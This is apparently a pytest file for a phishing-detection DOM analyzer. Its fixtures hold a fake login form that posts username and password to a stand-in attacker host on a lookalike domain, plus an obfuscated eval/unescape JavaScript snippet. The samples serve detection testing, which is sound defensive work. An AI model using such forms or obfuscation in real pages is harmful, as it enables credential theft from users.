import pytest
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.services.dom_analyzer import DOMAnalyzer
from app.services.base import AnalysisContext
from app.db.vector_store import VectorStore

@pytest.fixture
def dom_analyzer():
    return DOMAnalyzer(VectorStore())

def test_form_action_credential_theft(dom_analyzer):
    html = """
    <html>
      <body>
        <form action="http://malicious-exfiltrate.xyz/steal.php" method="POST">
          <input type="text" name="user">
          <input type="password" name="pass">
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
    """
    ctx = AnalysisContext(
        raw_url="http://victim-brand-lookalike.com/login",
        normalized_url="http://victim-brand-lookalike.com/login",
        scheme="http",
        domain="victim-brand-lookalike.com",
        subdomain="",
        suffix="com",
        path="/login",
        html_content=html,
        is_official_brand=False
    )
    res = dom_analyzer.analyze(ctx)
    assert res.details.get("form_action_mismatch") is True
    assert res.details.get("insecure_password_post") is True
    assert res.score >= 60.0

def test_obfuscated_javascript_detection(dom_analyzer):
    html = """
    <html>
      <head>
        <script>
          var _0x1a2b = ["\x65\x76\x61\x6c", "\x75\x6e\x65\x73\x63\x61\x70\x65"];
          eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65'));
        </script>
      </head>
      <body><h1>Secure Portal</h1></body>
    </html>
    """
    ctx = AnalysisContext(
        raw_url="http://evasive-phish.net",
        normalized_url="http://evasive-phish.net",
        scheme="http",
        domain="evasive-phish.net",
        subdomain="",
        suffix="net",
        path="/",
        html_content=html,
        is_official_brand=False
    )
    res = dom_analyzer.analyze(ctx)
    assert res.details.get("js_obfuscation_detected") is True
    assert res.score >= 25.0
